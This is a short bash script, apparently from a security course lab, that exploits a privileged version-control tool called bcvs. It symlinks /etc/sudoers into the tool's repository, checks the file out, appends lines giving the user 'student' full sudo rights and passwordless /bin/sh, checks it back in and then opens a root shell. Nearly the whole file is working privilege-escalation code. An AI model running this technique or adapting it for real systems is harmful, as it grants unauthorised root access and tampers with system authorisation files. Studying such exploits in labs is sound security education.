#!/bin/bash

#Sudo Symlink Exploit - This exploit uses symlinks to trick bcvs into checking out the sudoers file
#We then add ourself as a sudo user, and can easily get into the root shell!

#Make the bcvs directory if necessary
mkdir -p .bcvs

#Make the block list if necessary
touch .bcvs/block.list

#Make a fake input file to pass to the bcvs command
touch fakeinput
echo "fakeinput" >> fakeinput

#Make a symbolic link between the sudoers file and the bcvs repo
ln -s /etc/sudoers .bcvs/sudoers

#Checkout the sudoers file
/opt/bcvs/bcvs co sudoers < fakeinput

#Give ourselves all the permissions we could ever want
echo "student ALL=(ALL) ALL" >> sudoers
echo "student ALL=NOPASSWD: /bin/sh" >> sudoers

#Check it in and thus overwrite/deploy our new sudoers
/opt/bcvs/bcvs ci sudoers < fakeinput


#Our beloved root shell!
sudo /bin/sh
